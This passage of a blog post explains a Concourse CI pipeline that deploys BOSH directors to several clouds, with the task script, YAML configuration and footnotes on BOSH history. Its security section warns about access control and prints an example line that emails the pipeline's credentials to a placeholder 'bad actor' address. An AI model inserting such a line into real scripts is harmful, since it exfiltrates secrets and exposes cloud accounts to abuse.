in a manner which complicates our task shell script.]</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e># We abort the script as soon as we hit an error (as soon as a command exits</span>
</span></span><span style=display:flex><span><span style=color:#75715e># with a non-zero exit status)</span>
</span></span><span style=display:flex><span>set -e
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># `cunnie-deployments` is the checked-out GitHub repo that contains our BOSH</span>
</span></span><span style=display:flex><span><span style=color:#75715e># manifests and our directors&#39; `-state.json` files; it also contains this</span>
</span></span><span style=display:flex><span><span style=color:#75715e># script (task script) and task definition.</span>
</span></span><span style=display:flex><span>pushd cunnie-deployments
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># We invoke the script that generates our BOSH director&#39;s manifest, e.g.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># `aws.sh`, `azure.sh`. The output, the BOSH director&#39;s manifest, is named</span>
</span></span><span style=display:flex><span><span style=color:#75715e># `bosh-$IAAS.yml`, e.g. `bosh-aws.yml`</span>
</span></span><span style=display:flex><span>bin/$IAAS.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Does ${DEPLOYMENTS_YML} have a complete set of interpolated variables?</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Abort if not (`--var-errs`).</span>
</span></span><span style=display:flex><span>bosh int bosh-$IAAS.yml <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --var-errs <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -l &lt;<span style=color:#f92672>(</span>echo <span style=color:#e6db74>&#34;</span>$DEPLOYMENTS_YML<span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -l &lt;<span style=color:#f92672>(</span>curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml<span style=color:#f92672>)</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  &gt; /dev/null
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># We attempt to deploy our BOSH director. We prepare a git commit message</span>
</span></span><span style=display:flex><span><span style=color:#75715e># regardless whether our attempt succeeds or fails because we need to retain any</span>
</span></span><span style=display:flex><span><span style=color:#75715e># change to the BOSH director&#39;s `-state.json` file. This is necessary in cases</span>
</span></span><span style=display:flex><span><span style=color:#75715e># where a deploy proceeds far enough to create a broken director VM, for</span>
</span></span><span style=display:flex><span><span style=color:#75715e># subsequent deploys must be able to destroy the broken director VM in order to</span>
</span></span><span style=display:flex><span><span style=color:#75715e># free up its IP address so that the current deploy will succeed. The crucial</span>
</span></span><span style=display:flex><span><span style=color:#75715e># information needed to destroy the  broken director VM is its VM&#39;s ID, which is</span>
</span></span><span style=display:flex><span><span style=color:#75715e># recorded in the `-state.json` file.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Note that `set -e` does not trigger an abort if the command that returns a</span>
</span></span><span style=display:flex><span><span style=color:#75715e># non-zero exit code is the subject of an `if` block, i.e. `if bosh create-env`;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># this gives us the breathing room to commit our results regardless of whether</span>
</span></span><span style=display:flex><span><span style=color:#75715e># `bosh create-env` succeeded or failed</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> bosh create-env bosh-$IAAS.yml <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -l &lt;<span style=color:#f92672>(</span>echo <span style=color:#e6db74>&#34;</span>$DEPLOYMENTS_YML<span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -l &lt;<span style=color:#f92672>(</span>curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml<span style=color:#f92672>)</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  GIT_COMMIT_MESSAGE<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;CI PASS: </span>$IAAS<span style=color:#e6db74> BOSH deploy ✈️&#34;</span>
</span></span><span style=display:flex><span>  DEPLOY_EXIT_STATUS<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  GIT_COMMIT_MESSAGE<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;CI FAIL: </span>$IAAS<span style=color:#e6db74> BOSH deploy ✈️&#34;</span>
</span></span><span style=display:flex><span>  DEPLOY_EXIT_STATUS<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Do we need to commit anything? If a new director hasn&#39;t been deployed (most</span>
</span></span><span style=display:flex><span><span style=color:#75715e># often because there&#39;s been no change to the manifest, releases, or stemcell),</span>
</span></span><span style=display:flex><span><span style=color:#75715e># then we don&#39;t need to commit</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ! git diff --quiet HEAD --; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e># If we&#39;re in this block, then there has been a deployment. Let&#39;s set our</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e># git author to avoid git&#39;s `*** Please tell me who you are.` error.</span>
</span></span><span style=display:flex><span>  git config --global user.name <span style=color:#e6db74>&#34;Concourse CI&#34;</span>
</span></span><span style=display:flex><span>  git config --global user.email brian.cunnie@gmail.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e># We check out our branch&#39;s HEAD because Concourse&#39;s git-resource leaves us</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e># in `detached HEAD` state. ${DEPLOYMENTS_BRANCH} is typically set to</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e># `master`, but may be set to something else (usually while testing).</span>
</span></span><span style=display:flex><span>  git checkout $DEPLOYMENTS_BRANCH
</span></span><span style=display:flex><span>  git add .
</span></span><span style=display:flex><span>  git commit -m<span style=color:#e6db74>&#34;</span>$GIT_COMMIT_MESSAGE<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>popd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># We copy our repo with its new commit to a new directory. The Concourse job,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># after it finishes running this task, will push the new commit to GitHub.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Note that `cp -R` works as well as `rsync`; we use `rsync` by force of</span>
</span></span><span style=display:flex><span><span style=color:#75715e># habit.</span>
</span></span><span style=display:flex><span>rsync -aH cunnie-deployments/ cunnie-deployments-with-state/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># We exit with the return code of `bosh create-env`; if the deploy failed, then</span>
</span></span><span style=display:flex><span><span style=color:#75715e># this Concourse task failed</span>
</span></span><span style=display:flex><span>exit $DEPLOY_EXIT_STATUS
</span></span></code></pre></div><p>For those interested in the scripts which generate the BOSH director manifests
(e.g. <code>aws.sh</code>), they were covered in an earlier <a href=http://engineering.pivotal.io/post/bosh-ssl/>blog
post</a>. For links to the scripts
and the manifests they generate, see the table below:</p><table><thead><tr><th>IaaS</th><th>Script</th><th>Generated Manifest</th></tr></thead><tbody><tr><td>AWS</td><td><a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh>aws.sh</a></td><td><a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-aws.yml>bosh-aws.yml</a></td></tr><tr><td>Azure</td><td><a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/azure.sh>azure.sh</a></td><td><a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-azure.yml>bosh-azure.yml</a></td></tr><tr><td>GCP</td><td><a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/gce.sh>gce.sh</a></td><td><a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-gce.yml>bosh-gce.yml</a></td></tr></tbody></table><h3 id=a-namesimpler11-simplify-the-concourse-task-scripta><a name=simpler>1.1 Simplify the Concourse Task Script</a><a hidden class=anchor aria-hidden=true href=#a-namesimpler11-simplify-the-concourse-task-scripta>#</a></h3><div class="alert alert-warning" role=alert><p><b>Simplify the Concourse task script.</b> Specifically, inline the
<code>bosh-${IAAS}.sh</code> script, then collapse the two <code>bosh
interpolate</code> commands into the singular <code>bosh create-env</code>
command.</p></div><p><p>Start with a simple Concourse task script.
Really. Don&rsquo;t use the task script we use,
<sup><a href=#complicated class=alert-link>[Why so complicated?]</a></sup> ,
the one listed above. Instead, start with a
simplified task script, like
<a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh-simple.sh><code>bosh-simple.sh</code></a>.
We have tested it; it successfully deploys a director.</p><h3 id=12-concourse-task-configuration-file>1.2 Concourse Task Configuration file<a hidden class=anchor aria-hidden=true href=#12-concourse-task-configuration-file>#</a></h3><p>Now that we have our task&rsquo;s shell script, we turn our attention to our task&rsquo;s
(YAML) configuration file. It can be viewed on <a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh.yml>GitHub</a>,
and is displayed below, too:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>---
</span></span><span style=display:flex><span><span style=color:#f92672>platform</span>: <span style=color:#ae81ff>linux</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>image_resource</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>type</span>: <span style=color:#ae81ff>docker-image</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>source</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>repository</span>: <span style=color:#ae81ff>cunnie/fedora-golang-bosh</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>inputs</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>cunnie-deployments</span>
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>bosh-deployment</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>outputs</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>cunnie-deployments-with-state</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>params</span>:
</span></span><span style=display:flex><span>  <span style=color:#75715e># vainly default branch to master, but it&#39;s always overridden from the pipeline</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>DEPLOYMENTS_BRANCH</span>: <span style=color:#e6db74>&#39;master&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>DEPLOYMENTS_YML</span>: <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>IAAS</span>: <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>run</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>path</span>: <span style=color:#ae81ff>cunnie-deployments/ci/tasks/bosh.sh</span>
</span></span></code></pre></div><p>Notes:</p><p><code>image_resource:</code> We use a custom-built Docker image,
<code>cunnie/fedora-golang-bosh</code>
(<a href=https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/>https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/</a>); but you
may choose to use your own Docker image; just be sure that the <a href=https://github.com/cloudfoundry/bosh-cli>BOSH
CLI</a> is installed. Our image is fairly
hefty (450 MB), for it has a rich set of tools available to us when we need to
<a href=https://concourse.ci/fly-intercept.html>intercept</a> the container to
troubleshoot a build.</p><p><code>inputs:</code> We have two inputs:
<a href=https://github.com/cloudfoundry/bosh-deployment><code>bosh-deployment</code></a>, a git repo
which contains the manifests and tools necessary to deploy a BOSH director (this
is the canonical way to deploy a BOSH director), and
<a href=https://github.com/cunnie/deployments/><code>cunnie-deployments</code></a>, a git repo which
contains our BOSH directors&rsquo; manifests and state files. Also, this repo contains
the required Concourse task definition (<code>ci/tasks/bosh.yml</code>) and script
(<code>ci/tasks/bosh.sh</code>).</p><p><code>outputs:</code> We have one output, <code>cunnie-deployments-with-state</code>, which is the
same as the input, <code>cunnie-deployments</code>. Concourse prohibits an input from also
being an output, so our script copies the contents of one to the other.
<code>cunnie-deployments-with-state</code> includes the commits made by the task (in the
case of a deploy, the state file and possibly the BOSH director&rsquo;s manifest).
This output is used by a subsequent step in the Concourse job which will push
any git commits to GitHub (although this Concourse <em>task</em> may make git commits,
it won&rsquo;t push them — it leaves that responsibility to the Concourse <em>job</em>).</p><p><code>params:</code> <code>DEPLOYMENTS_BRANCH</code> is almost always set to <code>master</code>; it refers to
the branch in the <code>cunnie-deployments</code> repo. <code>IAAS</code> is either <code>aws</code>, <code>azure</code>, or
<code>gce</code>. <code>DEPLOYMENTS_YML</code> is YAML-formatted and contains secrets needed to
deploy; sample contents can be viewed in an earlier <a href=http://engineering.pivotal.io/post/bosh-ssl/#secrets_file>blog
post</a>.</p><p><em>[Note: you may opt to bypass the task configuration file completely and embed
the necessary information into <code>pipeline.yml</code>;
<a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/pipeline.yml#L54-L79>here</a>
is an example of embedding the task configuration directly into the pipeline.]</em></p><h2 id=2-concourse-jobs>2. Concourse Jobs<a hidden class=anchor aria-hidden=true href=#2-concourse-jobs>#</a></h2><p>The Concourse job is straightforward:</p><ul><li>It checks out the <code>cunnie-deployments</code> and <code>bosh-deployment</code> git repos</li><li>It runs the task which deploys the BOSH director to the specified IaaS</li><li>It pushes changes to the director manifest (<code>bosh-${IAAS}.yml</code>) and the
director state (<code>bosh-${IAAS}-state.json</code>) to the <code>cunnie-deployments</code> repo
regardless of whether the deploy succeeded or failed (i.e. the <code>ensure</code>
directive)</li></ul><p>Here is the Concourse job definition which deploys the BOSH director to the AWS
IaaS:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>jobs</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>bosh-aws.nono.io</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>plan</span>:
</span></span><span style=display:flex><span>  - <span style=color:#f92672>get</span>: <span style=color:#ae81ff>cunnie-deployments</span>
</span></span><span style=display:flex><span>  - <span style=color:#f92672>get</span>: <span style=color:#ae81ff>bosh-deployment</span>
</span></span><span style=display:flex><span>  - <span style=color:#f92672>task</span>: <span style=color:#ae81ff>deploy</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>file</span>: <span style=color:#ae81ff>cunnie-deployments/ci/tasks/bosh.yml</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>params</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>DEPLOYMENTS_BRANCH</span>: <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>DEPLOYMENTS_YML</span>: <span style=color:#ae81ff>((deployments_yml))</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>IAAS</span>: <span style=color:#ae81ff>aws</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>ensure</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>put</span>: <span style=color:#ae81ff>cunnie-deployments</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>params</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>repository</span>: <span style=color:#ae81ff>cunnie-deployments-with-state/</span>
</span></span></code></pre></div><h2 id=3-concourse-pipeline>3. Concourse Pipeline<a hidden class=anchor aria-hidden=true href=#3-concourse-pipeline>#</a></h2><p>The full Concourse pipeline (<code>pipeline.yml</code>) can be seen
<a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/pipeline.yml>here</a>.
Below is an abbreviated portion which shows the Concourse resources and the first
job (which deploys the AWS BOSH director):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#75715e># fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=&#34;$(lpass show --note github_deployments_key)&#34; -v deployments_yml=&#34;$(lpass show --note deployments.yml)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>bosh-aws.nono.io</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>plan</span>:
</span></span><span style=display:flex><span>  - <span style=color:#f92672>get</span>: <span style=color:#ae81ff>cunnie-deployments</span>
</span></span><span style=display:flex><span>  - <span style=color:#f92672>get</span>: <span style=color:#ae81ff>bosh-deployment</span>
</span></span><span style=display:flex><span>  - <span style=color:#f92672>task</span>: <span style=color:#ae81ff>deploy</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>file</span>: <span style=color:#ae81ff>cunnie-deployments/ci/tasks/bosh.yml</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>params</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>DEPLOYMENTS_BRANCH</span>: <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>DEPLOYMENTS_YML</span>: <span style=color:#ae81ff>((deployments_yml))</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>IAAS</span>: <span style=color:#ae81ff>aws</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>ensure</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>put</span>: <span style=color:#ae81ff>cunnie-deployments</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>params</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>repository</span>: <span style=color:#ae81ff>cunnie-deployments-with-state/</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Other jobs redacted for brevity</span>
</span></span><span style=display:flex><span><span style=color:#f92672>resources</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>cunnie-deployments</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>type</span>: <span style=color:#ae81ff>git</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>source</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>uri</span>: <span style=color:#ae81ff>git@github.com:cunnie/deployments.git</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>private_key</span>: <span style=color:#ae81ff>((github_deployments_key))</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>branch</span>: <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>bosh-deployment</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>type</span>: <span style=color:#ae81ff>git</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>source</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>uri</span>: <span style=color:#ae81ff>https://github.com/cloudfoundry/bosh-deployment.git</span>
</span></span></code></pre></div><p>Notes:</p><p>The first line is a convenience comment; it shows the <code>fly</code> (Concourse CLI)
command which updates the Concourse server&rsquo;s pipeline after changes have been
made to the <code>pipeline.yml</code> file. We cut-and-paste that comment into our shell
whenever we make a change to <code>pipeline.yml</code> in order to propagate the changes to
the pipeline to our Concourse server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>lpass show --note github_deployments_key<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> -v deployments_yml<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>lpass show --note deployments.yml<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><p>We have already discussed <code>deployments_yml</code> (i.e. the Concourse task environment
variable/parameter <code>DEPLOYMENTS_YML</code>), but the other variable,
<code>github_deployments_key</code>, warrants discussion. It is a <a href=https://developer.github.com/v3/guides/managing-deploy-keys/>GitHub deploy
key</a> which allows
our job to push changes to the <code>cunnie-deployments</code> repo
<sup><a href=#interpolation class=alert-link>[Interpolation]</a></sup> .</p><p>We&rsquo;d like to discuss how we stop the pipeline when the deploy of a BOSH director
fails. We use Concourse&rsquo;s <a href=https://concourse.ci/build-plans.html><code>passed</code></a>
directive. For example, if our deploy of the AWS director fails, we do <em>not</em>
want to deploy the Azure director.</p><p>The following shows the <code>diff</code> between the job to deploy the AWS director and
the job to deploy Azure director. Pay special attention to the <code>passed</code> and
<code>trigger</code> directives: the deploy of the Azure director is kicked off if and only
if there has been a successful deploy of the AWS director. This limits the
damage caused by a flawed configuration: only one director is knocked offline
(typically the first one, AWS), not all three.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:#f92672>-- name: bosh-aws.nono.io
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+- name: bosh-azure.nono.io
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   plan:
</span></span><span style=display:flex><span>   - get: cunnie-deployments
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    passed: [ bosh-aws.nono.io ]
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    trigger: true
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   - get: bosh-deployment
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    passed: [ bosh-aws.nono.io ]
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    trigger: true
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>   - task: deploy
</span></span><span style=display:flex><span>     file: cunnie-deployments/ci/tasks/bosh.yml
</span></span><span style=display:flex><span>     params:
</span></span><span style=display:flex><span>       DEPLOYMENTS_BRANCH: master
</span></span><span style=display:flex><span>       DEPLOYMENTS_YML: ((deployments_yml))
</span></span><span style=display:flex><span><span style=color:#f92672>-      IAAS: aws
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+      IAAS: azure
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     ensure:
</span></span><span style=display:flex><span>       put: cunnie-deployments
</span></span><span style=display:flex><span>       params:
</span></span></code></pre></div><h2 id=4-security>4. Security<a hidden class=anchor aria-hidden=true href=#4-security>#</a></h2><div class="alert alert-error" role=alert><p>Restrict your Concourse teams to people you trust, don&rsquo;t unnecessarily expose
your pipelines or publish your pipelines&rsquo; configurations (<code>.yml</code> files).
Similarly, restrict access to your GitHub repo which has your director manifests
and Concourse scripts.</p></div><p><p>Our credentials are stored in our Concourse pipeline, and they can be easily
revealed by a trusted user with the following command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fly -t nono get-pipeline -p BOSH
</span></span></code></pre></div><p>These credentials include IaaS credentials, which will allow a bad actor to spin
up multiple VMs to run, say, Bitcoin mining. A co-worker of the author whose
credentials were compromised had unauthorized AWS charges exceeding $3k.</p><p>It is also important to restrict access to the GitHub repo which contains the
scripts that are run. Although the repo does not contain credentials, it enables
the execution of commands which can reveal the credentials. For example, the
following line of code could be added to the <code>ci/tasks/bosh.sh</code> script to email
the credentials to the bad actor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>${</span>DEPLOYMENTS_YML<span style=color:#e6db74>}</span> | mail -s <span style=color:#e6db74>&#34;secret credentials&#34;</span> bad.actor@mailinator.com
</span></span></code></pre></div><h2 id=footnotes>Footnotes<a hidden class=anchor aria-hidden=true href=#footnotes>#</a></h2><p><a name=quis><sup>[Quis custodiet?]</sup></a> &ldquo;Who updates the VM [BOSH
director] that keeps the other VMs updated?&rdquo; is the question, versions of which
have been asked as long ago as the days of the Roman poet Juvenal, who famously
asked, &ldquo;<a href=https://en.wikipedia.org/wiki/Quis_custodiet_ipsos_custodes%3F>Quis custodiet ipsos
custodes?</a>&rdquo; and
as recently as this century by comic book writer Alan Moore, who phrased it,
&ldquo;Who watches the Watchmen?&rdquo;</p><p><a name=how_recent><sup>[How recent?]</sup></a>
How fresh is <code>bosh-deployment</code>? Fresh. <code>bosh-deployment</code> is a quite
active git repo, typically updated <a href=https://github.com/cloudfoundry/bosh-deployment/graphs/commit-activity>several times or more each
week</a>.
It&rsquo;s the tool that the BOSH team, and many Cloud Foundry teams, use to keep
their BOSH directors current.</p><p><a name=bosh_up_to_date><sup>[Updating BOSH]</sup></a> In the early days, the
BOSH micro plugin was the mechanism to update the BOSH director. There were
several drawbacks to the micro plugin, one of which is that it forced the BOSH
CLI to have an understanding of the API for various IaaSes, breaking the Cloud
Layer abstraction model.</p><p>Another drawback of the BOSH micro plugin was that it was brittle, so much so
that it was a common pattern to deploy a BOSH director whose sole purpose was to
deploy the &ldquo;real&rdquo; BOSH director. &ldquo;Ha!&rdquo; one might ask, &ldquo;But how did you keep that
first BOSH director up-to-date?&rdquo; The answer is simple: you didn&rsquo;t. You left that
first BOSH director running and never touched it except to redeploy the &ldquo;real&rdquo;
BOSH director. You might spin it down if you weren&rsquo;t using it, but you never
deleted it or updated it.</p><p>These were serious problems, and to address them the BOSH Core team wrote
<a href=https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20><code>bosh-init</code></a>,
a Golang-based executable whose purpose was to deploy BOSH directors. It adhered
to the Cloud Layer abstraction models (it used the existing CPIs (Cloud Provider
Interfaces) for the existing IaaSes (<a href=https://github.com/cloudfoundry-incubator/bosh-vsphere-cpi-release>VMware
vSphere</a>,
<a href=https://github.com/cloudfoundry-incubator/bosh-google-cpi-release>Google Cloud
Platform</a>
(GCP),
<a href=https://github.com/cloudfoundry-incubator/bosh-openstack-cpi-release>OpenStack</a>,
<a href=https://github.com/cloudfoundry-incubator/bosh-azure-cpi-release>Microsoft
Azure</a>, among
others)).</p><p>By April 30, 2015, <code>bosh-init</code> was production-ready, and the BOSH documentation
was <a href=https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20>updated</a>
to reflect the new world order.</p><p>But all was not perfect in the Garden of Eden, for the introduction of
<code>bosh-init</code> split the CLIs: whereas before there was one BOSH CLI, now there
were two: <code>bosh</code>, the original Ruby-based CLI for managing a BOSH director&rsquo;s
deployment, and <code>bosh-init</code> for deploying a BOSH director itself. In many ways
this resembled the <a href=https://en.wikipedia.org/wiki/Western_Schism>Western
Schism</a>, a dark chapter in the
Roman Catholic church when there were two popes (who had the terrible habit of
excommunicating each other). The BOSH development team remedied this situation
by creating a <em>third</em> CLI, the <a href=https://bosh.io/docs/cli-v2.html>Golang-based
CLI</a>. In this regard, the BOSH development
team&rsquo;s approach mirrored the approach attempted by the Catholic cardinals,
who elected a <em>third</em> pope. The BOSH team&rsquo;s approach succeeded, but the
cardinals&rsquo; didn&rsquo;t (they were left with three popes running around
excommunicating each other).</p><p><a name=one_click><sup>[One click]</sup></a> It&rsquo;s technically possible
to kick off the builds with <em>zero</em> clicks — to kick off the build automatically
if, say, a commit is pushed to the <em>bosh-deployment</em> repository. The modification
to the pipeline is trivial:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span> - name: bosh-aws.nono.io
</span></span><span style=display:flex><span>   plan:
</span></span><span style=display:flex><span>   - get: cunnie-deployments
</span></span><span style=display:flex><span>   - get: bosh-deployment
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    trigger: true
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> - task: deploy
</span></span></code></pre></div><p>However, the decision to trigger automatically is not without risks: the BOSH
director may be in the middle of a delicate task, such as updating a deployment,
